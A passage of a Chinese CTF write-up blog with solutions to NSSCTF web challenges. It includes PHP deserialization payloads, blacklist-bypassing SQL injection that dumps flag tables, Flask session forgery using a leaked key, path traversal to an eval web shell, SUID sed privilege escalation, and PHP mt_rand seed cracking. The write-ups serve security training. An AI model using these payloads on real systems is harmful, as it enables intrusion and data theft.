class="string">&#x27;FL_AG&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$c</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(flag).*$/&#x27;</span>, <span class="variable">$ja</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;You are bad guy!!!&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;Congratulation!!&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$hint1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Please input my love FL_AG&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;game over!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>数组绕过，变量覆盖</p>
<p>payload1:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">FL_AG=$ja=1</span><br><span class="line">#L0vey0U.php</span><br></pre></td></tr></table></figure>

<p>进入第二层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;globals.php&quot;</span>;</span><br><span class="line"><span class="variable">$FAKE_KEY</span> = <span class="string">&quot;Do you love CTF?&quot;</span>;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;YES I love&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$hint2</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;YES I love&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="comment">#s:10:&quot;YES I love&quot;;</span></span><br></pre></td></tr></table></figure>

<p>payload2:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?str=s:10:&quot;YES I love&quot;;</span><br><span class="line">#P0int.php</span><br></pre></td></tr></table></figure>

<p>进入第三层</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clazz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Clazz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Clazz</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;b=&amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:5:&quot;Clazz&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">data=O:5:&quot;Clazz&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240104110704550.png" alt="image-20240104110704550"></p>
<h1 id="158-HUBUCTF-2022-新生赛-Calculate"><a href="#158-HUBUCTF-2022-新生赛-Calculate" class="headerlink" title="158.[HUBUCTF 2022 新生赛]Calculate"></a>158.[HUBUCTF 2022 新生赛]Calculate</h1><p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:28525/&#x27;</span></span><br><span class="line">sess = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    res=sess.get(url).text.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">7</span>].split(<span class="string">&#x27;&lt;/div&#x27;</span>)</span><br><span class="line"><span class="comment"># print(res.text.split(&#x27;\n&#x27;))</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    exp=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">if</span> i[-<span class="number">1</span>]==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        exp+=i[-<span class="number">1</span>]</span><br><span class="line">    ans = <span class="built_in">eval</span>(exp)</span><br><span class="line">    data=&#123;<span class="string">&#x27;ans&#x27;</span>:<span class="string">&#x27;%s&#x27;</span> %ans&#125;</span><br><span class="line">    req = sess.post(url,data)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br></pre></td></tr></table></figure>

<h1 id="159-NSSCTF-2022-Spring-Recruit-babysql"><a href="#159-NSSCTF-2022-Spring-Recruit-babysql" class="headerlink" title="159.[NSSCTF 2022 Spring Recruit]babysql"></a>159.[NSSCTF 2022 Spring Recruit]babysql</h1><p>fuzz的时候发现了waf</p>
<p><code>hacker!!black_list is /if|and|\s|#|--/i</code></p>
<p>空格被ban了，用的是&#x2F;**&#x2F;</p>
<p>试一下联合注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload1:</span><br><span class="line"><span class="string">&#x27;union/**/select/**/(select/**/database())&#x27;</span></span><br><span class="line">#string(<span class="number">4</span>) &quot;test&quot;</span><br><span class="line">payload2:</span><br><span class="line"><span class="string">&#x27;union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;</span>test<span class="string">&#x27;)&#x27;</span></span><br><span class="line">#string(<span class="number">10</span>) &quot;flag,users&quot;</span><br><span class="line">payload3:</span><br><span class="line"><span class="string">&#x27;union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;</span>flag<span class="string">&#x27;)&#x27;</span></span><br><span class="line">#string(<span class="number">4</span>) &quot;flag&quot;</span><br><span class="line">payload4:</span><br><span class="line"><span class="string">&#x27;union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)&#x27;</span></span><br><span class="line">#string(<span class="number">63</span>) &quot;前有巨大宝箱,NSSCTF&#123;ac8126df-401a-49e0-a8b1-c167f1f8bbd6&#125;&quot;</span><br></pre></td></tr></table></figure>

<h1 id="160-NSSRound-13-Basic-flask-jwt"><a href="#160-NSSRound-13-Basic-flask-jwt" class="headerlink" title="160.[NSSRound#13 Basic]flask?jwt?"></a>160.[NSSRound#13 Basic]flask?jwt?</h1><p>随便注册个账号，登陆点拿flag，不是admin，在修改密码处F12看到secretkey，flasksession伪造即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py decode -c <span class="string">&#x27;.eJwljjkOAzEIAP_iOgVgwGY_s_IBSlpvtory91hKO8XMfNIZy69nOt7r9kc6XzMdqVYDChjmGBNdtEuOQkqZMASpTkTqOrRBKaFOYTqqQBWZTWxwJXOeLNWscQEcwjHZtwF7dMikqK3lPhA3Ei67FhwjHIpmTHvkvnz9bzR9fzvmLb8.ZZZS8g.QkgPNvEbeSRvbLg6rbwUl8NGvd0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#userid改为1</span></span><br><span class="line"></span><br><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&quot;th3f1askisfunny&quot;</span> -t <span class="string">&quot;&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;06f231c9009af8bd640aa6c80172276e1653f82e55f8820c4fd4c78e8cc286fb5cde1a80b04b0da6ba3b51ada4097611c50f1c05cfd67346f7e3331a98b1481c&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">.eJwlzsENwzAIAMBd_O4DbINxlokAg9Jv0ryq7t5KvQnuXfY84zrK9jrveJT9ucpWgLM29AkwNcUWd1BlF8BR6-BAppZSgyhFKnjP1X1IiHsVTiNfgSpg0A2WsmkzQl3aYQ5GdIJEB_JcPFrnHNFaQ51i2AW9_CL3Fed_g-XzBZsFLu0.ZZZVRQ.H3mGCzqQ0I4GrNLRwYh9kIobHmQ</span><br></pre></td></tr></table></figure>

<h1 id="161-湖湘杯-2021-final-Penetratable"><a href="#161-湖湘杯-2021-final-Penetratable" class="headerlink" title="161.[湖湘杯 2021 final]Penetratable"></a>161.[湖湘杯 2021 final]Penetratable</h1><p> unicode欺骗用过不好使，因为登陆时会被解析为已有的admin，需要用</p>
<p><code>admin&quot;#</code>注册，登陆后显示的就是admin，修改admin的密码然后登陆，抓包修改root的密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=admin&amp;m=updatePassword</span><br><span class="line"></span><br><span class="line">//这里的name和saying是b64，两个pass是md5，把root做b64编码然后放包就能改root的密码，然后以root登陆</span><br><span class="line">name=YWRtaW4%3D&amp;newPass=c4ca4238a0b923820dcc509a6f75849b&amp;oldPass=c4ca4238a0b923820dcc509a6f75849b&amp;saying=MQ%3D%3D</span><br></pre></td></tr></table></figure>

<p>可以看到日志模块，下载的时候抓包存在目录穿越</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=root&amp;m=downloadRequestLog&amp;filename=../../../../../var/www/html/phpinfo.php</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;pass_31d5df001717&#x27;</span>])===<span class="string">&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>]);&#125; </span><br><span class="line"><span class="comment">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>木马连接密码解md5为<code>1q2w3e</code>，传木马并执行命令，flag在根目录无法直接读取，需要suid提权</p>
<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<p>回显了sed等，使用sed提权</p>
<p><code>pass_31d5df001717=1q2w3e&amp;cc=system(&quot;sed -n &#39;1p&#39; /flag&quot;);</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">常见的sed命令选项包含以下几种：</span><br><span class="line">-e或-expression=：表示用指定命令或者脚本来处理输入的文本文件</span><br><span class="line">-f或-file-：表示用指定的脚本文件来处理输入的文件文件</span><br><span class="line">-h或–help：显示帮助</span><br><span class="line">-n、-quite或silent：表示仅表示处理后的结果</span><br><span class="line">-i：直接编辑文本文件</span><br><span class="line"></span><br><span class="line">a：增加，在当前行下面增加一行指定内容。</span><br><span class="line">c：替换，讲选定行替换为指定内容。</span><br><span class="line">d：删除，删除选定的行。</span><br><span class="line">i：插入，在选定行上面插入一行指定内容。</span><br><span class="line">p：打印，如果同时指定行，表示打印指定行；如果不指定行，则表示打印所有内容，如果又非打印字符，则以ASCLL码输出。通常与“-n”选项一起使用。</span><br><span class="line">s：替换，替换指定字符</span><br><span class="line">y：字符转换</span><br></pre></td></tr></table></figure>

<h1 id="162-MoeCTF-2022-Sqlmap-boy"><a href="#162-MoeCTF-2022-Sqlmap-boy" class="headerlink" title="162.[MoeCTF 2022]Sqlmap_boy"></a>162.[MoeCTF 2022]Sqlmap_boy</h1><p>登陆界面F12发现sql语句</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $sql = &#x27;select username,password from users where username=&quot;&#x27;.$username.&#x27;&quot; &amp;&amp; password=&quot;&#x27;.$password.&#x27;&quot;;&#x27;; --&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>admin&quot; or &quot;1--+</code></p>
<p>然后id就是注入点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload1</span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()--+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2</span><br><span class="line">0&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;--+</span><br><span class="line"></span><br><span class="line">payload3</span><br><span class="line">0&#x27;union/**/select/**/1,3,group_concat(flAg)/**/from/**/moectf.flag--+</span><br></pre></td></tr></table></figure>

<h1 id="163-FSCTF-2023-巴巴托斯！"><a href="#163-FSCTF-2023-巴巴托斯！" class="headerlink" title="163.[FSCTF 2023]巴巴托斯！"></a>163.[FSCTF 2023]巴巴托斯！</h1><p>改http头，本地访问改的不是xff是referer</p>
<p>然后伪协议读flag.php</p>
<h1 id="164-GWCTF-2019-枯燥的抽奖"><a href="#164-GWCTF-2019-枯燥的抽奖" class="headerlink" title="164.[GWCTF 2019]枯燥的抽奖"></a>164.[GWCTF 2019]枯燥的抽奖</h1><p>BUU做过，F12发现check.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;hkDZsGIKav&#x27;</span> <span class="comment">#题目生成的</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p><code>php_mt_seed</code>爆破种子</p>
<p><img src="/images/image-20240104162852005.png" alt="image-20240104162852005"></p>
<p>把种子的值赋值给<code>$_SESSION[&#39;seed&#39;]</code>输出原始的字符串提交</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="number">631128164</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure>

<h1 id="165-HNCTF-2022-WEEK2-easy-unser"><a href="#165-HNCTF-2022-WEEK2-easy-unser" class="headerlink" title="165.[HNCTF 2022 WEEK2]easy_unser"></a>165.[HNCTF 2022 WEEK2]easy_unser</h1><p>很直接的反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 